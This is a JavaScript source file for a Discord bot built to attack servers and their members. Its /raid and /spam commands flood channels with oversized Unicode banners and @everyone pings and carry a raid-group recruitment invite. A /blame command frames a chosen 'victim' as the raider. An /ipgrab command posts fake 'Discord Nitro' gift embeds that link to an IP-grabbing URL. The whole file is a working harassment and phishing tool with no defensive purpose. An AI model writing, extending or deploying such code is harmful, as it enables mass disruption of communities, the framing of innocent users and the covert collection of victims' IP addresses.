import 'dotenv/config';
import { randomUUID } from 'node:crypto';
import {
  Client, GatewayIntentBits, Events, MessageFlags,
  ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder,
} from 'discord.js';

// ---- config ----
const RAID_LINES = 60;  // how many ﷽ lines
const RAID_CHARS = 14;  // how many ﷽ per line

const NITRO_ICON = 'https://cdn3.emoji.gg/emojis/7536-nitro.png';
const IPGRAB_LINK = 'https://discord-gg-zjk2bx79e.base44.app';

const raidBanner = Array.from(
  { length: RAID_LINES },
  () => '# ' + '﷽'.repeat(RAID_CHARS)
).join('\n');

const RAID_MESSAGE = [
  raidBanner,
  '||<@everyone|@here>||',
  '-# Raided by Kxrzt',
  '-# Want to raid other servers? Join us.',
  '',
  'https://discord.gg/BdgWQ4pGaq',
].join('\n');

const RAID_COUNT = 20; // /raid spam count
const SPAM_COUNT = 5;  // /spam spam count
// ----------------

const MENTIONS = { parse: ['everyone', 'roles', 'users'] };

// temp storage so the spam button remembers your text
const spamCache = new Map();

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

client.once(Events.ClientReady, c => console.log(`Online as ${c.user.tag}`));

client.on(Events.InteractionCreate, async interaction => {
  try {
    // ---------------- /raid ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'raid') {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId('raid_button')
          .setLabel('raid')
          .setStyle(ButtonStyle.Primary)
      );
      return interaction.reply({
        content: 'start raid?',
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
    }

    if (interaction.isButton() && interaction.customId === 'raid_button') {
      await interaction.reply({ content: RAID_MESSAGE, allowedMentions: MENTIONS });
      for (let i = 1; i < RAID_COUNT; i++) {
        await interaction.followUp({ content: RAID_MESSAGE, allowedMentions: MENTIONS });
      }
      return;
    }

    // ---------------- /spam ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'spam') {
      const text = interaction.options.getString('message');
      const id = randomUUID();
      spamCache.set(id, text);
      setTimeout(() => spamCache.delete(id), 60 * 60 * 1000); // clean up after 1h

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`spam:${id}`)
          .setLabel('spam')
          .setStyle(ButtonStyle.Primary)
      );
      return interaction.reply({
        content: 'Spam ur message',
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
    }

    if (interaction.isButton() && interaction.customId.startsWith('spam:')) {
      const id = interaction.customId.slice(5);
      const text = spamCache.get(id) ?? '...';
      await interaction.reply({ content: text, allowedMentions: MENTIONS });
      for (let i = 1; i < SPAM_COUNT; i++) {
        await interaction.followUp({ content: text, allowedMentions: MENTIONS });
      }
      return;
    }

    // ---------------- /blame ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'blame') {
      const victim = interaction.options.getUser('victim');
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`blame:${victim.id}`)
          .setLabel('blame')
          .setStyle(ButtonStyle.Danger)
      );
      return interaction.reply({
        content: `<@${victim.id}>`,
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
    }

    if (interaction.isButton() && interaction.customId.startsWith('blame:')) {
      const victimId = interaction.customId.slice(6);
      await interaction.reply({
        content: `<@${victimId}> Your Raid has been succesful!`,
        allowedMentions: MENTIONS,
      });
      return;
    }

    // ---------------- /ipgrab ----------------
    if (interaction.isChatInputCommand() && interaction.commandName === 'ipgrab') {
      const amount = interaction.options.getInteger('amount') ?? 1;

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setCustomId(`ipgrab:${amount}`)
          .setLabel('send')
          .setStyle(ButtonStyle.Success)
      );

      return interaction.reply({
        content: 'get their ip',
        components: [row],
        flags: MessageFlags.Ephemeral,
      });
    }

    if (interaction.isButton() && interaction.customId.startsWith('ipgrab:')) {
      const amount = Number(interaction.customId.slice(7)) || 1;

      const buildEmbed = () => new EmbedBuilder()
        .setColor(0x5865F2)
        .setTitle('Discord Nitro')
        .setDescription(
          'Someone sent you a gift!\n\n' +
          `[Click here to redeem your Nitro!](${IPGRAB_LINK})\n\n` +
          '**Expires in 48 hours**'
        )
        .setThumbnail(NITRO_ICON);

      await interaction.reply({ embeds: [buildEmbed()] });
      for (let i = 1; i < amount; i++) {
        await interaction.followUp({ embeds: [buildEmbed()] });
      }
      return;
    }
  } catch (err) {
    console.error(err);
  }
});

client.login(process.env.DISCORD_TOKEN);
